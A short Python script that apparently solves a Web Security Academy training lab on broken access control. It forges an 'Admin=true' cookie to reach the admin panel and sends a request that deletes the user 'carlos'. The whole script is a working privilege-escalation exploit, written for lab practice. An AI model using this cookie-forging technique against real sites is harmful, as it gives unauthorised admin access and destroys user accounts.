#########################################################
#
# Lab: User role controlled by request parameter
#
# Hack Steps: 
#      1. Add the cookie 'Admin' and set it to 'true'
#      2. Delete carlos from the admin panel
#
#########################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0af3000c033c263f813fc613007d003f.web-security-academy.net"

def main():
    print(Fore.WHITE + "❯❯ Deleting carlos from the admin panel after setting the 'Admin' cookie to true.. ", end="", flush=True)

    cookies = { "Admin": "true" }
    fetch("/admin/delete?username=carlos", cookies=cookies)
  
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)
        
        
if __name__ == "__main__":
    main()

